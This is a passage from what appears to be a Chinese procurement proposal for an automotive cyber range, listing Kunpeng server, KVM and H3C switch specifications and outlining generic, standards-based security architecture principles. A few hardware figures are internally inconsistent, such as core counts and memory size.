测试工具服务器。</p><p>产品功能参数：</p><ol><li>机器类型：机架式服务器，2U。2U机架式服务器在保持紧凑机架尺寸的同时，提供了较多的扩展空间，适合容纳更多硬件资源，如存储驱动器和扩展卡，优化了数据中心空间利用率，适合构建高密度计算环境。</li><li>处理器：配置2颗Kunpeng 920处理器；单颗处理器主频2.6GHz, 核数32核；单颗20核处理器提供多核并行处理能力，适合多线程任务，2.6GHz主频确保了单核性能，平衡了高吞吐量与任务响应时间，适合服务器和高性能计算需求。</li><li>内存：配置512GB DDR4内存；256GB DDR4 内存特性:容量大、数据传输数率高、工作能效高、支持更高的密度和更大的单模块容量、有个更高的可靠性。</li><li>2*固态硬盘480GB硬盘4*8000GB的硬盘；两个480GB固态硬盘提供快速的系统启动和应用加载，而四个8TB机械硬盘则提供大量存储空间，适合需要快速系统响应和大规模数据存储的环境。</li><li>Raid卡配置独立RAID卡，支持RAID 0,1,5,6，10，50,60，2G缓存，含断电保护；独立RAID卡支持多种RAID级别，提供数据保护和性能优化选项。2G缓存增强数据处理速度，断电保护确保数据完整性，适合对数据安全性和读写性能有较高要求的应用场景。</li><li>配置4个千兆以太网（GE）口可以显著增强网络的带宽和冗余性，支持高速数据传输、多网络分割和负载均衡，适合高性能和高可靠性网络需求。</li><li>提供正版的操作系统，配置正版操作系统授权；</li><li>配置900W冗余热插拔电源；确保了在主电源故障时能够无缝切换到备用电源，从而减少系统停机时间，保障关键业务的连续运行。</li><li>提供三年原厂维保。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c3110e5d80fb34f44118658e4ef1609a.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3ec6c90ca970e5b21a1d4f56a565301e.png"></p><h5 id="虚拟计算服务器（ARM）配置方案"><a href="#虚拟计算服务器（ARM）配置方案" class="headerlink" title="虚拟计算服务器（ARM）配置方案"></a>虚拟计算服务器（ARM）配置方案</h5><ol><li>处理器</li></ol><p>型号: 2x Kunpeng 920</p><p>主频: 2.6GHz</p><p>核数: 每颗32核，共64核</p><ol><li>内存</li></ol><p>容量: 256GB DDR4</p><p>规格: 8x 32GB DDR4-2933 RDIMM</p><ol><li>硬盘配置</li></ol><p>固态硬盘(SSD):</p><p>2x 国产480GB SATA SSD</p><p>机械硬盘(HDD):</p><p>4x 国产8TB SATA HDD</p><ol><li>RAID卡</li></ol><p>型号: 国产独立RAID卡</p><p>支持RAID级别: 0, 1, 5, 6, 10, 50, 60</p><p>缓存: 2GB，含断电保护</p><ol><li>网络接口</li></ol><p>GE电口:</p><p>4x 千兆以太网端口</p><ol><li>操作系统</li></ol><p>授权: 正版操作系统授权，具体操作系统版本需根据服务器兼容性和用户需求确定</p><ol><li>电源</li></ol><p>功率: 900W</p><p>特性: 冗余热插拔电源</p><ol><li>服务器机箱</li></ol><p>类型: 2U机架式服务器机箱</p><p>兼容性: 兼容以上列出的硬件配置</p><h3 id="机房设备"><a href="#机房设备" class="headerlink" title="机房设备"></a>机房设备</h3><h4 id="KVM设备"><a href="#KVM设备" class="headerlink" title="KVM设备"></a>KVM设备</h4><p>提供等于2台秦安KVM-定制设备，该设备是一个集成了多端口KVM切换功能于1U高度空间的控制平台，它通过一组设备（包含LCD显示器、键盘、鼠标）实现对多台计算机的操作。从而节省了为每台计算机单独配置键盘、鼠标、监视器的费用以及它们所占用的空间。安装快速简单，只需要将电缆连接到正确的端口上，而无须软件配置，因此不存在复杂的安装过程或不兼容问题。KVM-1716可直接连接并控制16台主机，支持多硬件平台和多操作系统。</p><h5 id="功能实施方案-13"><a href="#功能实施方案-13" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>提供2套19寸液晶屏幕，键盘，鼠标的一套物理的输入和输出设备。</li><li>提供1路外接VGA视频接口、键盘鼠标外接接口，允许外部设备连接。</li><li>支持32端口的设备能够提供大量的网络连接，适合高密度连接环境，能够满足大规模局域网的需求，增强网络的灵活性和扩展性。</li><li>支持最大连接数256，指的是通过级联连接其他KVM切换器，可以控制的最大服务器数量。</li><li>支持混合界面（PS/2 USB)连接各种服务器，工控机设备，可以连接使用PS/2或USB接口的设备</li><li>支持服务器到KVM 直接采用超五类线缆连接，服务器通过超五类线缆直接连接到KVM，支持长达50米的稳定数据传输，这种布局方便了远程管理，同时保证了信号质量和网络性能。</li><li>支持多种操作系统iMAC, MS,windows,Netware,Unix,Linux,兼容多种不同的操作系统</li><li>具备嵌入管理OSD菜单软件，有一个内置的屏幕显示菜单（On-Screen Display）进行管理和配置</li><li>支持端口加密，扫描，命名，OSD切换，面板按键切换，提供安全特性和便捷的切换功能</li><li>支持热插拔功能，可以在不关闭电源的情况下连接或断开服务器。</li><li>支持级联功能，最大三级级联，可以连接多个KVM切换器，增加控制的服务器数量</li><li>支持切换主机服务器时保存键盘状态信息，在切换控制的服务器时，保持键盘的状态</li><li>支持本地用户视频分辨率1280*1024 60Hz，支持特定的视频分辨率和刷新率；设备能够提供清晰、流畅的图像显示，适合需要高分辨率和稳定显示效果的应用场景。</li><li>工作温度0°至 50°C (32°至 122°F)。这是指KVM切换器在正常运行时的环境温度范围。在这个温度范围内，设备能够正常工作而不会出现性能下降或损坏。</li><li>存储温度-20°至 60°C (-4°至 140°F)。这是指设备在关闭和未使用时可以安全存放的环境温度范围。在这个范围外，极端的温度可能会对设备的物理组件造成损害。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/de9e7fc42716366e4e534d20818fa090.jpeg" alt="8口PS2控制平台"></p><h3 id="网络设备"><a href="#网络设备" class="headerlink" title="网络设备"></a>网络设备</h3><h4 id="汇聚交换机"><a href="#汇聚交换机" class="headerlink" title="汇聚交换机"></a>汇聚交换机</h4><p>汇聚交换机选用1台品牌为：H3C新华三，型号为： S5024X-HPWR-E的汇聚交换机，该汇聚交换机可用于连接多个边缘交换机或终端设备，并将它们的流量聚合到核心网络中。汇聚交换机通常用于构建大型企业网络或数据中心网络，以提供高带宽、高可靠性和灵活性的网络连接。</p><h5 id="功能实施方案-14"><a href="#功能实施方案-14" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>提供1台品牌为：H3C新华三，型号为： S5024X-HPWR-E的汇集交换机。</p><p>产品功能参数如下：</p><ol><li>包转发率276Mpps，设备能够高效处理大量网络数据，确保网络通信的高速性和低延迟，适合数据中心和大型企业网络环境；</li><li>该交换机支持传输网络协议支持IEEE 802.1P，IEEE 802.1Q，IEEE 802.1d，IEEE 802.1ad，IEEE 802.3x，IEEE 802.3ad，IEEE 802.3等；</li><li>支持基于VLAN的ACL，可以设置基于虚拟局域网的访问控制策略；</li><li>支持Ingress/Egress ACL，可以控制进入和离开网络的流量，以及流量的速率限制；</li><li>支持Ingress/Egress CAR（Committed Access Rate）且粒度达到8Kbps的交换机能够细致控制进出带宽，确保网络流量管理的精确性，优化带宽分配，提升网络服务质量；</li><li>支持两级Meter能力，能够进行两级流量监测和控制；</li><li>支持VLAN聚合CAR，MAC聚合CAR功能，支持基于VLAN和MAC地址的流量速率限制；</li><li>支持流量整形，可以控制数据流，以避免网络拥塞；</li><li>支持802.1P/DSCP优先级Mark/Remark，支持对流量进行优先级标记，以便在网络中进行优先传输；</li><li>支持层次化QoS（H-QoS），支持高级的服务质量管理，包括三级队列调度；</li><li>支持队列调度机制，包括SP（Strict Priority）、WRR（Weighted Round Robin）、SP+WRR和CBWFQ（Class-Based Weighted Fair Queueing）等调度策略；</li><li>配备了24个千兆以太网光接口，这些接口使用小型可插拔（SFP）模块，与LC（Lucent Connector）类型的光纤连接器相兼容，适用于连接长距离、高速度的光纤网络。此外，设备还提供4个万兆以太网光接口，使用增强型小型可插拔（SFP+）模块，也配备LC类型的光纤连接器，支持更高速率的数据传输，适合数据中心、核心网络或连接至高速上游网络的应用。支持SC（Subscriber Connector或Standard Connector）类型的连接器；</li><li>提供了48个千兆以太网电接口模块，这些接口采用常见的RJ45连接器，适用于标准的双绞线电缆连接，以支持多达48个千兆位以太网连接；</li><li>配备了双交流电源模块，每个模块的功率为300瓦，提供冗余电源功能以确保持续不间断的运行；</li><li>该网络设备支持各种文件传输协议，包括FTP（文件传输协议）、TFTP（简单文件传输协议）和Xmodem，这些协议允许用户通过网络上传和下载文件；</li><li>支持简单网络管理协议（SNMP）的v1、v2和v3版本，这是一种广泛使用的网络管理协议，用于监控和管理网络设备以及其上的数据流；</li><li>支持sFlow标准，这是一种基于采样的流量监测技术，用于实时收集网络流量信息；</li><li>支持远程监控（RMON），一种网络管理协议，允许管理员远程监控网络操作和性能数据，以便进行故障排除和网络性能提升；</li><li>支持网络时间协议（NTP），确保设备时钟与全球统一时间标准同步，为网络事件记录和安全协议提供准确的时间戳；</li><li>支持NetStream流量统计功能，它可以详细记录网络流量信息，助力管理员进行流量分析、容量规划和网络安全监控；</li><li>支持Portal认证功能，允许实施基于Web的用户身份验证，以控制和管理设备网络访问权限；</li><li>支持MAC地址认证，通过验证设备的物理地址来控制网络接入，增强了对网络资源的安全管理；</li><li>支持IEEE 802.1x端口基础访问控制协议和内置IEEE 802.1x服务器功能，为网络提供基于身份的认证和授权，以增强网络访问安全性；</li><li>支持AAA/Radius协议，实现了认证、授权和计费功能，以提供集中的用户访问管理，确保网络资源的安全性和合规性；</li><li>支持HWTACACS协议，允许通过命令行进行认证，实现了对用户身份的验证以及对命令访问的控制，从而增强了网络的安全管理</li><li>支持SSHv1.5和SSHv2，为远程管理提供了安全的加密连接，以防止敏感数据在传输过程中被截获或篡改；</li><li>支持ACL（访问控制列表）流过滤机制，允许细粒度地控制进出网络的数据流，从而实现高效的安全管理和流量控制；</li><li>支持OSPF、RIPv2及BGPv4协议，并提供明文及MD5加密认证选项，以确保路由信息的完整性和网络之间的安全通信；</li><li>支持命令行采用分级保护方式，防止未授权用户的非法侵入，为不同级别的用户有不同的配置权限；</li><li>支持通过限制只有特定IP地址的用户能够通过Telnet登录，并采用口令认证机制，增强了远程访问的安全性；</li><li>支持能够实现IP地址、VLAN ID、MAC地址和端口等多种属性的组合绑定，从而提供灵活的网络资源管理和增强的访问控制策略；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3f37a76c3533534a710744f5f3702ec6.png"></p><h4 id="接入交换机"><a href="#接入交换机" class="headerlink" title="接入交换机"></a>接入交换机</h4><p>接入交换机选用6台品牌为：H3C新华三，型号为：S4080X-HPWR-F的接入交换机，该接入交换机可用于连接多个边缘交换机或终端设备，并将它们的流量聚合到核心网络中。接入交换机通常用于构建大型企业网络或数据中心网络，以提供高带宽、高可靠性和灵活性的网络连接。</p><h5 id="功能实施方案-15"><a href="#功能实施方案-15" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li><p>支持千兆交换功能，能够自适应10/100/1000Mbps的传输速率，确保与不同速率的网络设备兼容并优化性能；</p></li><li><p>具备24个10/100/1000Base-T自适应以太网端口，提供灵活的网络连接选项，并包含8个可作为光纤或电缆接口使用的combo口，以满足多样化的网络部署需求；</p></li><li><p>提供4个万兆SFP+口，可进行快速的光电交换；拥有4个万兆SFP+口的设备能够提供高速的光纤连接和电信号交换，支持数据中心和高性能计算环境中的大带宽需求，确保快速稳定的网络通信。</p></li><li><p>一个设备上配备一个console口、一个RJ-45 Console口和一个Micro USB Console口，为网络管理员提供了多元化的本地接入方式。Console口通常用于命令行界面的直接访问，RJ-45 Console口提供了标准的网络线缆连接，而Micro USB Console口则允许通过常见的USB接口使用便携设备进行配置。这种设计确保了在不同的操作环境和设备限制下，网络管理员都能灵活地进行设备管理和故障诊断。</p></li><li><p>具备高级VLAN功能的网络设备能够更细致地控制网络流量和增强安全性。它支持基于端口、MAC地址、协议和IP子网的VLAN划分，实现复杂的网络隔离和优化。QinQ和灵活QinQ扩展了VLAN的应用，允许跨多个网络的VLAN标签嵌套。VLAN映射提供了跨不同VLAN的数据流重组能力，而Voice VLAN优化了语音数据的传输。MVRP（多VLAN注册协议）则自动管理VLAN信息，简化了网络配置和维护。这些功能共同构成了一个强大而灵活的VLAN管理系统。</p></li><li><p>包转发率为216百万包每秒（Mpps），能够高效处理大量网络流量；</p></li><li><p>供一个可扩展插槽，支持多种接口板卡选项，包括2端口40GE QSFP+、2端口万兆SFP+、2端口万兆电口、8端口万兆SFP+和12端口万兆SFP+，以满足不同的网络扩展需求，为了方便管理和维护，设备配置丰富的接口和指示灯；</p></li><li><p>支持通过XModem、FTP、TFTP进行软件加载和升级，并允许用户通过命令行接口（CLI）、Telnet和Console口进行配置；</p></li><li><p>支持SNMPv1/v2/v3和WEB网管，提供RMON告警、事件和历史记录功能，兼容iMC智能管理中心，并具备系统日志记录、分级告警以及调试信息输出能力；</p></li><li><p>支持网络时间同步（NTP），具备电源、风扇和温度告警功能，并能执行Ping和Tracert网络诊断命令；</p></li><li><p>支持VCT、DLDP、LLDP和端口环回检测的网络设备提供了全面的链路监测和故障诊断工具。VCT（Virtual Cable Test）电缆检测功能可以远程测试网络线缆的状态，识别线缆故障。DLDP（Device Link Detection Protocol）用于检测并防止单向链路造成的网络问题。LLDP（Link Layer Discovery Protocol）允许设备发现网络中的其他设备，并收集它们的配置信息。而端口环回检测功能则可以识别并防止端口级别的环路问题，这对于维护网络的稳定运行至关重要。这些功能的结合，极大地提升了网络的可靠性和管理员的管理效率。</p></li><li><p>支持L2至L4包过滤功能的网络设备提供了高度精细的流量管理能力。它能够基于多种参数如源和目的MAC地址、IP地址、TCP/UDP端口号和VLAN标识进行流量分类，实现复杂的访问控制策略。时间段ACL允许根据时间条件应用访问规则，而双向ACL策略确保了入站和出站流量的严格控制。此外，该设备还能在VLAN层次上施加ACL，并对端口的流量进行细粒度的速率限制，从而增强了网络安全性和带宽管理的灵活性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e440b134a581b40c03d248d4e9a147ca.png"></p></li></ol><h4 id="POE交换机"><a href="#POE交换机" class="headerlink" title="POE交换机"></a>POE交换机</h4><p>POE交换机选用1台品牌为：H3C新华三，型号为：S5055X-HPWR的POE交换机，该POE交换机可用于连接多个边缘交换机或终端设备，并将它们的流量聚合到核心网络中。POE交换机通常用于构建大型企业网络或数据中心网络，以提供高带宽、高可靠性和灵活性的网络连接。</p><h5 id="功能实施方案-16"><a href="#功能实施方案-16" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>提供1台品牌为：H3C新华三，型号为：S5055X-HPWR的POE交换机。</p><p>功能参数如下：</p><ol><li>支持千兆交换功能，能够自适应10/100/1000Mbps的传输速率，确保与不同速率的网络设备兼容并优化性能</li><li>具备126百万包每秒（Mpps）的包转发能力</li><li>设备拥有24个10/100/1000Base-T以太网端口，提供灵活的速率选择以适应不同的网络环境和设备需求。其中8个端口具备combo口功能，可以根据需要切换使用传统的铜缆或光纤连接。此外，它还配备了4个10G BASE-X SFP+万兆光纤端口，支持高速数据传输，适合作为上行链路或连接至高性能服务器和存储设备。这样的组合确保了设备既能满足日常办公的稳定性需求，又能应对数据中心的高带宽需求。</li><li>支持基于端口的VLAN功能允许网络管理员根据物理端口划分不同的虚拟局域网，从而实现网络隔离和流量管理。基于MAC的VLAN则能够依据设备的MAC地址将其分配到特定的VLAN中，提供更为动态的网络配置选项。而基于协议的VLAN功能可以根据网络协议类型，如IP、IPX或AppleTalk等，自动将流量分配到预定义的VLAN，进一步细化流量分流和安全控制。这些VLAN功能合作增强了网络的灵活性和安全性。</li><li>支持QinQ和灵活QinQ功能，允许在一个VLAN标签内嵌套另一个VLAN标签，以实现复杂的网络层次和扩展的虚拟网络</li><li>支持VLAN映射（VLAN Mapping）以实现跨不同VLAN的数据流重定向，支持Voice VLAN以优化语音数据的传输，并支持通用VLAN注册协议（GVRP）以自动管理VLAN成员资格和分布</li><li>支持IGMP Snooping和MLD Snooping功能，能够有效管理和优化IPv4和IPv6多播流量，通过监控Internet Group Management Protocol (IGMP)和Multicast Listener Discovery (MLD)消息来确保多播数据仅被发送至对应的订阅接收者</li><li>支持组播VLAN功能，允许将多播流量限制在特定的VLAN内，以提高网络效率并减少不必要的多播流量扩散</li><li>具备复杂的流量管理功能，能够对端口的接收和发送报文速率进行限制，支持报文重定向和CAR（Committed Access Rate）以控制带宽使用，提供每个端口8个输出队列，并通过端口队列调度策略（如SP、WRR、SP+WRR）及802.1p和DSCP优先级重新标记来优化服务质量（QoS）</li><li>提供全面的安全性特性，包括分级用户管理与口令保护，支持802.1X、MAC地址以及Triple认证，Guest VLAN功能，RADIUS认证，SSH 2.0加密访问，端口隔离与安全，MAC地址学习数量限制，IP源地址保护，ARP入侵检测，IP+MAC+端口绑定以及EAD（Endpoint Admission Defense）端点准入防御系统</li><li>最小电源功率需求为27瓦，适用于交流电（AC）供电</li></ol><ul><li><p>单360W:334W（PoE为280W）</p></li><li><p>双360W:678W（PoE为600W）</p></li><li><p>单560W:573W（PoE为480W）</p></li><li><p>双560W:918W（PoE为810W）</p></li><li><p>单720W:676W（PoE为600W）</p></li><li><p>双720W:905W（PoE为810W）</p></li><li><p>单1110W:898W（PoE为810W）</p></li><li><p>双1110W:905W（PoE为810W）</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/bf1d7da2abebba3581bd1d58d7ff2753.png"></p></li></ul><h4 id="万兆交换机"><a href="#万兆交换机" class="headerlink" title="万兆交换机"></a>万兆交换机</h4><p>万兆交换机选用3台品牌为：H3C新华三，型号为：S6520X-HI的万兆交换机，该万兆交换机可用于连接多个边缘交换机或终端设备，并将它们的流量聚合到核心网络中。万兆交换机通常用于构建大型企业网络或数据中心网络，以提供高带宽、高可靠性和灵活性的网络连接。</p><h5 id="功能实施方案-17"><a href="#功能实施方案-17" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>提供3台品牌为：H3C新华三，型号为：S6520X-HI的万兆交换机。</p><p>功能参数如下：</p><ol><li><p>采用1U机架式设计，适合标准机架安装，占用空间高度为一个单位（1U）；</p></li><li><p>提供48个10G Base-T以太网端口和4个40G QSFP+光纤端口，以支持高速网络连接；</p></li><li><p>具备1.28Tbps的交换能力，并支持高达11.52Tbps的交换容量扩展，确保交换机在处理大量数据时的性能和稳定性；</p></li><li><p>数据包转发率为每秒960百万个数据包（Mpps），进一步提升了交换机处理数据包的能力；</p></li><li><p>支持存储转发（store-forward）模式和直通（cut-through）模式两种数据包转发机制，根据数据包类型和需求选择合适的转发模式，提高了交换机的工作效率和灵活性；</p></li><li><p>支持IRF2智能弹性架构，允许2至9台设备的本地或远程堆叠，实现分布式管理、链路聚合和路由，并采用基于LACP、BFD、ARP的MAD机制进行堆叠分裂检测，具备基于LACP、BFD和ARP的MAD堆叠分裂检测机制，确保网络的高可用性；</p></li><li><p>支持高达4094个基于端口的VLAN，满足大规模网络的划分需求，还支持Default VLAN、Super VLAN和PVLAN等高级VLAN特性，即能够支持包括默认VLAN配置，以及更高级的Super VLAN和私有VLAN（PVLAN）功能，便于网络管理和安全控制，实现复杂的网络隔离和权限管理。</p></li><li><p>支持多种链路冗余和网络恢复协议，包括生成树协议（STP）、快速生成树协议（RSTP）、多生成树协议（MSTP），以及SmartLink、快速环网保护协议（RRPP）和符合G.8032标准的以太环保护协议（ERPS），确保网络的稳定性和可靠性。这些协议能够在网络发生故障时快速切换路径，减少网络中断时间。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f0d879f38b458bd5ff483627e3a2426c.png" alt="IMG_256"></p></li></ol><h4 id="千兆交换机"><a href="#千兆交换机" class="headerlink" title="千兆交换机"></a>千兆交换机</h4><p>千兆交换机选用3台品牌为：新华三（H3C），型号为：S5120V3-52P的千兆交换机，该千兆交换机可用于连接多个边缘交换机或终端设备，并将它们的流量聚合到核心网络中。千兆交换机通常用于构建大型企业网络或数据中心网络，以提供高带宽、高可靠性和灵活性的网络连接。</p><h5 id="功能实施方案-18"><a href="#功能实施方案-18" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li><p>配备48个10/100/1000BASE-T以太网端口，4个兼容10G和1G速率的BASE-X SFP+光模块端口，1个用于额外端口扩展的槽位，以及2个风扇模块和2个电源模块的可更换槽位；</p></li><li><p>具备高达756Gbps/7.56Tbps的交换容量，意味着它能够在极高速率下处理大量数据，适合高带宽需求的大型网络环境。</p></li><li><p>设备拥有252Mpps/432Mpps的包转发率，能够每秒处理高达数亿个数据包，确保即使在数据流量密集的情况下也能保持高效和稳定的网络性能。</p></li><li><p>设备支持store-forward和cut-through两种转发模式，store-forward模式确保数据完整性，通过检查每个数据包再转发；cut-through模式则提高速度，一旦识别目标地址即开始转发数据包，适用于低延迟场景。</p></li><li><p>虚拟化支持IRF2智能弹性架构，包括分布式设备管理、分布式链路聚合和分布式弹性路由。该系统通过标准以太网接口实现堆叠，支持2至9台设备的本地或远程堆叠。同时，它还提供基于LACP、BFD和ARP的MAD堆叠分裂检测机制。这种架构为网络提供高度的可靠性和弹性。</p></li><li><p>设备支持高度灵活的VLAN配置，包括最多4094个基于端口的VLAN，同时提供Default VLAN用于未标记流量，Super VLAN以实现跨多个VLAN的简化管理，以及PVLAN以确保子网内部隔离。</p></li><li><p>设备提供全面的冗余协议支持，包括STP, RSTP和MSTP以防止网络环路，SmartLink和RRPP快速链路备份，以及符合G.8032标准的ERPS以实现以太网环的鲁棒保护。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/93221f59fae199bd4f5ba999a05c7787.png"></p></li></ol><h3 id="网络安全防护"><a href="#网络安全防护" class="headerlink" title="网络安全防护"></a>网络安全防护</h3><p>提供详尽的网络安全防护方案，具备防护APT攻击、常见网络安全攻击能力。方案如下。</p><h4 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h4><p>基于xxx汽车网络靶场的业务需求，以及靶场面临的安全问题，很难通过一次安全建设将数据中心面临的所有风险解决；同时，安全风险也是动态发展变化的，因此解决方案也需要随着靶场的安全需求变化不断完善和发展。在云计算时代数据中心信息安全架构时，不能像传统IDC系统集成或者安全集成那样，头痛医头，脚痛医脚，而应该充分结合虚拟化的特点来系统地进行规划，考虑数据中心外围物理实体以及虚拟化平台环境的各类安全需求和特性，从而达到各类安全产品、安全管理、整体安全策略的统一，发挥最大的效率。在设计数据中心安全建议方案时，充分利用现有国和国际安全标准和成熟的安全体系，结合系统的实际需求，利用在安全领域的成熟经验，设计出一个有针对性的安全设计方案。解决思路如下：</p><ol><li><p>对靶场进行安全域划分，根据各区域的业务特性、技术特性以及安全需求进行对应的安全防护设计；</p></li><li><p>要充分考虑网络层、操作系统层、虚拟化层、应用层以及数据层的安全防护需求，特别是虚拟化等新技术带来的问题。</p></li><li><p>强调安全运营的价值，实现预警、检测、响应、溯源的闭环流程；</p></li></ol><h4 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h4><ol><li>业务保障原则：安全体系的设计目标是能够更好的保障网络上承载的业务。在保证安全的同时，还要保障业务的正常运行和运行效率。</li><li>结构简化原则：安全架构规划的直接目的和效果是要将整个网络变得更加简单，简单的网络结构便于设计防护体系。比如，安全域划分并不是粒度越细越好，安全域数量过多过杂可能导致安全域的管理过于复杂和困难。</li><li>立体协防原则：应避免形成各个安全产品独立割裂的安全体系，充分利用威胁情报和大数据等新技术，实现网络、终端、边界的立体协防机制。</li><li>等级保护原则：根据业务系统的重要程度以及考虑风险威胁、安全需求、安全成本等因素，将其划为不同的安全保护等级并采取相应的安全保护技术、管理措施。</li><li>可扩展性原则：当有新的业务系统需要接入数据中心时，可按照等级保护、对端可信度等原则将其分别划分至不同安全等级域的各个子域。</li><li>可管理性原则：应当采用集中化、自动化、智能化的安全管理手段，减轻安全的负担，同时减小因为管理上的疏漏而对系统安全造成的威胁。</li></ol><h4 id="基础安全能力"><a href="#基础安全能力" class="headerlink" title="基础安全能力"></a>基础安全能力</h4><h5 id="功能实施方案-19"><a href="#功能实施方案-19" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>为确保汽车安全运营平台及其相关系统的持续、稳定和可靠运行，必须采取一系列安全措施。这包括实施强健的网络安全协议以保障数据传输的机密性和完整性，确保关键信息的高度可用性。系统应部署先进的防火墙和入侵检测系统来防御黑客攻击、病毒和恶意软件，同时定期更新软件和安全补丁以堵塞潜在的安全漏洞。敏感数据的加密存储和传输是必不可少的，以防止未经授权的访问和数据泄露。此外，应实施访问控制策略，确保只有授权人员能够访问特定的系统资源。定期进行安全审计和风险评估也是至关重要的，以便及时发现和修复安全弱点。为了最大限度地减少服务中断的风险，需要建立一个全面的灾难恢复计划和业务连续性策略。这涉及到备份关键数据和系统，以便在发生故障时快速恢复服务。通过这些措施，可以确保即使在遭受网络攻击或其他形式的破坏时，系统也能快速恢复，从而维护汽车安全运营平台的稳定性和可靠性。</li><li>系统的防护完全依据《网络安全等级保护基本要求》中的三级保护标准进行规划和建设，构建了一套符合等保三级要求的基础安全技术框架，确保了系统的安全性和防护能力。</li><li>通过成熟可靠的安全技术和产品，结合专业技术人员的经验和能力，系统化地构建安全技术体系，确保安全性与可用性有机结合，满足适用性要求。这种综合方法结合了安全技术、专业经验，确保技术体系的稳健性与可信赖性。</li><li>安全技术体系建设综合考虑通信网络、区域边界和计算环境等多个层面。这包括部署防火墙和入侵检测系统以加固区域边界，使用加密技术保护通信网络的数据传输安全，以及实施身份验证和访问控制策略来保障计算环境的安全。此外，定期的安全评估和监控也是确保技术体系持续有效运行的关键。通过这些措施，构建了一个既安全又高效的技术防护体系，满足了系统稳定运行的需求。</li><li>结合具体的网络环境和网络域划分，制定精细化的安全域，并为每个安全域设计了相应的防护方案。这些方案包括但不限于防火墙隔离、入侵检测系统、数据加密传输、访问控制和安全监测。通过这些措施，可以确保系统平台在各个安全域之间运行时的整体安全与可靠性，防止潜在的安全威胁和风险，保障平台的稳定性和用户数据的安全。</li></ol><h5 id="安全建设"><a href="#安全建设" class="headerlink" title="安全建设"></a>安全建设</h5><p>建立基础安全技术体系框架：参照《网络安全等级保护基本要求》中的三级保护要求，搭建基础安全技术体系框架。这包括使用成熟可靠的安全技术和安全产品，结合专业技术人员的安全技术经验和能力，确保技术体系的安全性和可用性有机结合，满足适用性要求。</p><p>引入成熟的安全技术和产品：选择符合行业标准和规范的成熟安全技术和产品，例如防火墙、入侵检测系统、反病毒软件等。这些安全技术和产品可以提供网络流量监控、异常检测、恶意代码拦截等功能，有效抵御黑客、病毒和恶意代码对信息系统的攻击和破坏。</p><p>建立安全域与安全防护方案：结合网络环境和网络域的划分，制定安全域划分方案，并相应地实施安全防护措施。安全域划分可以将系统划分为不同的安全区域，根据不同的安全等级和敏感程度设置相应的安全防护措施，以确保整体系统的安全可靠。</p><p>加强通信网络安全：通过采用加密协议、身份认证、访问控制等手段，保障通信网络的安全性。这包括对数据传输进行加密保护，确保机密性和完整性；采用身份认证技术，确认通信双方的身份和可信度；设置访问控制策略，限制非授权访问等。</p><p>建立全面的安全监控和审计机制：引入日志记录、行为分析、异常检测等技术手段，实现对系统的全面安全监控和审计。及时发现异常行为并采取相应的响应和处置措施，防止对外服务中断和系统运行事故的发生。</p><p>通过以上措施，可以有效增强汽车安全运营平台及相关系统的安全性和稳定性，抵御各类攻击和破坏，并确保系统的持续运行和信息的保护。</p><h4 id="安全架构设计"><a href="#安全架构设计" class="headerlink" title="安全架构设计"></a>安全架构设计</h4><p>安全通信网络能力涵盖网络架构、通信传输、可信验证方面。</p><p>安全通信网络能力是指在网络架构、通信传输和可信验证等方面保障通信的安全性。在网络架构方面，应考虑建立分层结构和安全策略，以实现网络资源的合理管理和访问控制。在通信传输方面，应采用加密协议和安全传输机制，确保数据在传输过程中的机密性、完整性和可用性。在可信验证方面，应使用身份认证、数字证书等技术手段，确认通信双方的身份和可信度，防止伪造和篡改等安全威胁。</p><p>网络域的划分应根据应用范围、重要性和所涉及信息的重要程度等因素进行合理设计。</p><p>网络域的划分是指将整个网络拆分为多个逻辑区域或子网，以实现对不同应用、重要性和信息的隔离和管理。划分网络域的目的是为了提高网络的安全性和可管理性。合理的网络域划分应考虑应用范围，将具有相似功能或需求的系统或服务划分到同一个网络域中，便于管理和控制。此外，还应根据重要性和所涉及信息的重要程度，将关键系统或敏感数据划分到独立的网络域中，以加强保护和隔离。</p><p>保证网络各个部分的带宽满足业务高峰期需要。</p><p>为了保证网络的正常运行和满足业务高峰期的需求，需要对网络各个部分的带宽进行合理规划和配置。带宽是指网络传输速率的衡量标准，它影响着网络的传输效率和性能。在规划网络带宽时，需要根据业务的特点和需求，合理分配带宽资源，确保每个部分都能满足其所需的带宽需求。在高峰期，可以通过动态调整带宽分配，优先满足关键业务的需求，保障网络的可用性和性能。</p><p>构建远程访问加密能力，在众测期间实现对白帽子的行为进行全面审计监控。</p><p>为了保障远程访问的安全性，可以建立远程访问加密能力。远程访问加密技术可以通过使用加密协议、身份认证和访问控制等手段，确保远程通信的机密性和完整性。在众测期间，为了对白帽子的行为进行全面审计监控，可以通过日志记录和行为分析等方法，对远程访问行为进行监控和审计。这样可以及时发现异常行为，并采取相应的措施进行响应和处置，提高系统的安全性和稳定性。</p><p>根据上述的安全域划分架构，对数据中心进行整体安全设计，如下图所示：</p><p><img src= 